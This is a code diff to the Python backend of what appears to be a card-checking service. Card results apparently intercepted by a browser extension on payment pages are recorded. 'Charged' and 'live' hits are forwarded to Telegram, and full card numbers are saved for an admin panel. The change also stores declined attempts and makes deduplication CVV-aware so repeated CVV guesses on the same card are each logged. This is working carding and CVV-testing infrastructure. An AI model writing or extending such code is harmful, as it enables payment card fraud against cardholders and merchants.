@@ -245,11 +245,19 @@ def _extract_client_ip(request: Request) -> str | None:
         return None
 
 
-def _dedup_key(telegram_id: int | str, card_number: str, status: str, url: str | None) -> str:
+def _dedup_key(telegram_id: int | str, card_number: str, status: str, url: str | None, cvv: str | None = None) -> str:
     # Use the FULL card number (not last-6) so two distinct cards that happen to
     # share their last digits within the dedup window are never collapsed into
     # one. The key lives only in an in-memory dict, never logged or persisted.
-    return f"{telegram_id}|{card_number or ''}|{(status or '').lower()}|{(url or '').split('?')[0][:120]}"
+    #
+    # `cvv` is included ONLY for non-forwardable (declined/dead/error)
+    # persistence: a user testing several CVVs on the SAME card in quick
+    # succession makes distinct attempts that must each get their own history
+    # row, while the fetch+XHR double-fire of a SINGLE response (same cvv) still
+    # collapses to one. Forwardable (charged/live) dedup omits cvv — its
+    # PAN+status+url key is the proven guard against duplicate Telegram sends.
+    base = f"{telegram_id}|{card_number or ''}|{(status or '').lower()}|{(url or '').split('?')[0][:120]}"
+    return f"{base}|{cvv}" if cvv else base
 
 
 def _is_duplicate_hit(key: str) -> bool:
@@ -313,6 +321,12 @@ async def submit_status(
     is_charged = status_norm in ("charged", "success", "approved", "succeeded", "captured")
     is_live = status_norm in ("live", "ccn_live", "3d_live")
     should_forward = is_charged or is_live
+    # PERSISTENCE (v4.1): every attempt that carries a REAL card number is saved
+    # to db.hits — not just charged/live — so the user's dashboard History tab
+    # shows declines (incl. incorrect-CVV) with their card + date. A card-less
+    # result (junk gateway JSON on an unrelated page) is never persisted, so the
+    # history stays meaningful. Telegram forwarding is still charged/live only.
+    should_persist = len((number or "").replace(" ", "")) >= 12
 
     # HARD RULE (server-side defense-in-depth): a forwardable hit MUST carry a
     # real card number. Reject `USD 0.00 CHARGED` false positives coming from
@@ -334,13 +348,23 @@ async def submit_status(
             log.warning("dropping CHARGED with zero/negative amount: amount=%r", _amt)
             return {"success": False, "hitId": None, "forwarded": False, "dropped": "zero_amount"}
 
-    # Deduplicate: same user + card + status + url within 20s → drop silently.
-    # Applied only to forwardable statuses (CHARGED/LIVE) since DEAD isn't forwarded.
+    # Deduplicate: same user + card + status + url within the dedup window → drop.
+    # Forwardable (CHARGED/LIVE): PAN-based key — the proven guard against double
+    # Telegram sends when both the fetch AND XHR interceptors fire on one response.
     if should_forward:
         dkey = _dedup_key(user.telegram_id, number, body.status or "", body.url or body.siteUrl)
         if _is_duplicate_hit(dkey):
             # Never log the dedup key itself — it embeds the FULL card number.
             log.info("duplicate hit dropped: tid=%s last4=%s status=%s",
+                     user.telegram_id, (number or "")[-4:], status_norm)
+            return {"success": True, "hitId": None, "forwarded": False, "duplicate": True}
+    elif should_persist:
+        # Non-forwardable persisted (declined/dead/error): CVV-aware key so the
+        # SAME response fired twice (fetch+XHR) collapses to one row, but a user
+        # retrying DIFFERENT CVVs on the same card keeps a row per attempt.
+        dkey = _dedup_key(user.telegram_id, number, body.status or "", body.url or body.siteUrl, cvv=card.get("cvv"))
+        if _is_duplicate_hit(dkey):
+            log.info("duplicate non-forwardable hit dropped: tid=%s last4=%s status=%s",
                      user.telegram_id, (number or "")[-4:], status_norm)
             return {"success": True, "hitId": None, "forwarded": False, "duplicate": True}
 
@@ -382,17 +406,21 @@ async def submit_status(
         from_outdated_ext=from_outdated_ext,
         ext_sent_version=outdated_sent_v if from_outdated_ext else None,
     )
-    # PERMANENT STORAGE POLICY (v4.0): CHARGED and LIVE hits are saved to the DB
-    # (keyed by telegram_id) so the admin panel can look up a user's charged +
-    # live cards. DEAD/declined/error are still NOT persisted (notification-only).
+    # PERSISTENCE POLICY (v4.1): CHARGED and LIVE hits are saved to the DB (keyed
+    # by telegram_id) so the admin panel can look up a user's charged + live
+    # cards. DECLINED/DEAD/ERROR hits that carry a REAL card are ALSO saved now
+    # (below, before the SSE nudge) so the user's dashboard History tab shows
+    # every attempt — incl. incorrect-CVV declines — with card + date. They are
+    # NOT forwarded to Telegram (charged/live only); card-less results never
+    # persist so junk gateway JSON can't create empty history rows.
     #
-    # DURABILITY ORDERING: for CHARGED hits the actual DB insert is DEFERRED until
-    # AFTER the durable outbox entries are written (see the forward section). This
-    # guarantees a charged hit can never be persisted/visible in the dashboard
-    # without its Telegram delivery work already existing durably — closing the
-    # "saved to DB but never reached Telegram" gap even if the process crashes
-    # mid-request. Both writes hit the same Mongo instance, so either both survive
-    # or neither does.
+    # DURABILITY ORDERING: for CHARGED/LIVE hits the actual DB insert is DEFERRED
+    # until AFTER the durable outbox entries are written (see the forward
+    # section). This guarantees a forwardable hit can never be persisted/visible
+    # in the dashboard without its Telegram delivery work already existing
+    # durably — closing the "saved to DB but never reached Telegram" gap even if
+    # the process crashes mid-request. Both writes hit the same Mongo instance,
+    # so either both survive or neither does.
     hit_id = None
 
     # Update user counters. Best-effort: a counter-update failure is logged, never
@@ -406,6 +434,17 @@ async def submit_status(
         await db.users.update_one({"telegram_id": user.telegram_id}, {"$inc": inc})
     except Exception as _e:
         log.warning("user counter update failed (hit already saved): %s", _e)
+
+    # Persist non-forwardable hits (declined/dead/error) that carry a real card
+    # NOW — before the SSE nudge — so the dashboard's live refresh picks up the
+    # new row. Forwardable CHARGED/LIVE inserts stay deferred until after the
+    # outbox enqueues (durability ordering above).
+    if not should_forward and should_persist:
+        try:
+            ins = await db.hits.insert_one(hit.to_mongo())
+            hit_id = str(ins.inserted_id)
+        except Exception as _e:
+            log.warning("non-forwardable hit insert failed: %s", _e)
 
     # Notify any open dashboard tabs via SSE so stats/history refresh live.
     # publish() is non-blocking — it enqueues to in-memory asyncio.Queue(s).
